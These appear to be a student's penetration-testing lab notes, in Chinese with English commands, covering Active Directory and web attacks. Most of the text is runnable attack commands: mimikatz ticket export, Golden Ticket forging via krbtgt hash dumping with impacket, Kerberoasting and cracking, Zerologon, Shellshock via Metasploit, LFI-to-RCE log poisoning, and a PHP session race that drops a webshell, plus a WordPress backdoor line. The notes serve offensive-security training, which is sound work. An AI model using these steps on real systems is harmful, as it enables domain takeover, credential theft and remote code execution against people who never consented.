AD
===
```bash
# service
DNS
Kerberos
LDAP
GC(3268)



# parent child
# 網域名稱的延續 其他沒有任何關連性
Bule.com  =>  Child.Blue.com

# forest
Bule.com  =>  Child.Blue.com
Red.com

# tree跟tree之間 就變forest
# AD管理單位:forest




# 管理身分
1. Administrator
2. Domain Admins => 在domain中權限最大 也可以管理機器
lusrmgr.msc (再加入電腦網域的時候domain會直接被加到Administrator Properties)
service.msc
3. Enterprise Admins

Permission -> ACL
priviledge : 你可以對頁系統做的事情
Right : 權力 => Loacl Computer Plocy > windows settings > Security Settings > Local Polices > User Right...

whoami /groups
whoami /pri

Computer\HKEY_LOCAL_MACHINE\SAM\SAM #我用Administrator也看不到(?  


RunFromProcess-x64.exe 928 cmd.exe  #928 winlogon
whoami /pri


# AD資料庫實體
WIndows >  > ntds.dit

Schema
configuration
Domain (blue、sub、blue、red) #DC只有自己那個domain裡面的資料
                            # GC有所有人的AD資料


# 可以用adsi EDII資料庫 = AD使用者及電腦
# Configuration 除了domain設定以外 AD其他設定都在這個裡面
```
ADRecon
```bash
powershell -ep bypass #關閉安全設定

# 有一般AD帳號就可以情蒐
.\ADRecon.ps1 -OutputType HTML
```

Kerbors
```
三個角色


Client                   KDC                         Server




PtT:
1.Ticket Export 票券匯出
2.Golden Ticket Attack (TGT)
3.Sliver Ticket Attack (TGST) 
```
1.Ticket Export 票券匯出
```bash
# 1. Ticket Export 票券匯出
# 特權CMD
# 2019 DC

klist  # krbtgt => TGT
       # host   => TGST

mimikatz

privilege::debug

sekurlsa::tickets /export

kerberos::list

```
```bash
2.Golden Ticket Attack (TGT)
# https://cloud.tencent.com/developer/article/1752178

# AD WIN的本地帳號


# 用本機登入  連線失敗
dir \\server2019.lpt.com\c$


# 票怎麼選 先選有administrator
kerberos::ptt “*.kirbi”
klist

# 是是看可否連線
dir \\server2019.lpt.com\c$



```
2.Golden Ticket Attack (TGT)
```bash
# Parrot
sudo nano /etc/hosts
> 192.168.177.19 server2019.lpt.com

# hash_ntlm
secretsdump.py 'administrator:Pa$$w0rd'@192.168.177.19 -just-dc-user krbtgt

# SID   
python3 /opt/impacket/examples/lookupsid.py 'administrator:Pa$$w0rd'@192.168.177.19 0

# Create Ticket
python3 /opt/impacket/examples/ticketer.py -nthash <ntlm_hash> -domain-sid <sid> -domain lpt.com evil



# 掛載黃金票券
export KRB5CCNAME=~/evil.ccache

psexec.py lpt.com/evil@server2019.lpt.com -k -no-pass -dc-ip 192.168.177.19

```
3.Sliver Tickets
```bash
# Kerberosting Attack
# 用票去破解密碼
# 觸發驗證SPN scan
# 取得TGST
# 破解


# 2019DC
# set service
setspn -s starwar/lpt.com user-one

# Parrot實做
# SPN scan
GetUserSPNs.py 'lpt.com/cpent:Pa$$w0rd' -dc-ip 192.168.177.19
GetUserSPNs.py 'lpt.com/cpent:Pa$$w0rd' -dc-ip 192.168.177.19 -request -outputfile kerberoast.txt
# starwar - user-one
# 可以路封包 kerbors找TGSrep


# Crash
john kerberoast.txt

# 直接拿服務的帳號去登入
# 拿服務帳號去簽SliverTicket


#=====================================

# windows實做  #AD win
# Rubeus Precompiled (r3motecontrol)
Rubeus kerberoast /domain:lpt.com



```

# Zerologon
```bash
# AD Win
# 本機登入

# 超痛 AD會爆掉

# 新版的minikataz才有zerologon功能

Zerologon  > DCSync
```

# Shellshock 
```bash
bash內設定環境變數裡面內的神奇字串 (){ :; }
後面的指令會被執行起來


# CGI bin底下最嚴重的問題大概也是shellcode
# shellshock
cd /usr/lib/cgi-bin



dirb http://192.168.0.24
# http://192.168.0.24/cgi-bin/   403
# http://host.domain.com/path/resource[?Query]

# 思考一下被403的resource到底是什麼
# 是這個位置底下的default page被deny掉


dirb http://192.168.0.24/cgi-bin/keygen
```
meta
```bash
msfconsole -q

search shellcode
use 5
show options

set rhosts 192.168.0.24
set targeturi /cgi-bin/keygen
expliot

shell
script -c /bin/bash -q /dev/null

# 提權 PwnKit
uname -a

```


# LFI RCE
```bash
# parator
ssh administrator@192.168.0.10
cd /var/www/html/
echo '<?php phpinfo();?>' > info.php


echo '<?php include();?>' > info.php
echo '<?php include($_GET["f"]);?>' > inc.php

cd /var/log/apache2
chmod -R 775 /var/log/apache2



http://192.168.0.10/inc.php?f=/var/log/apache2
# https://medium.com/@josewice7/lfi-to-rce-via-log-poisoning-db3e0e7a1cf1


# agent
curl -G http://192.168.0.10/inc.php --data-urlencode "f=/var/log/apache2/access.log" --data-urlencode "1=id"
```
ssh
```bash
cat /var/log/auth.log
```
Orange PHP session
```bash
# 2018 CTF
# Session Tragedy

# php runtime 會把 session狀態記錄下來
http://192.168.0.10/inc.php?f=info.php
# 5.4以上  fileupload=on progress=on save_path=/var/lib/php

# 產垃圾檔
python -c 'print "A" * 2048*1024' >> junk.txt
wc junk.txt


# evil dropper.txt
evildropper:<?php file_put_contents("/tmp/shell.php","<?php system($_GET[3]);?>")?>



curl -s "http://192.168.0.10/inc.php?f=/var/lib/php5/sess_uploadupload"
# include
while true; do (curl -s "http://192.168.0.10/inc.php?f=/var/lib/php5/sess_uploadupload" | grep evildropper); done


# uplaod test
curl http://192.168.0.10/inc.php -H 'Cookie: PHPSESSID=uploaduplaod' -F 'PHP_SESSION_UPLOAD_PROGRESS=evildropper' -F 'files=@junk.txt'

# upload paylaod
curl http://192.168.0.10/inc.php -H 'Cookie: PHPSESSID=uploaduplaod' -F 'PHP_SESSION_UPLOAD_PROGRESS=<evildropper.txt' -F 'files=@junk.txt'


http://192.168.0.10/inc.php?f=/tmp/shell.php?3=id

```
wordpress LFI
```bash
# wordpress site editor 1.1.1.1
Hello Dolly backdoor

system($_GET['cmd']);

/wp-content/plugins/hello_dolly.php
```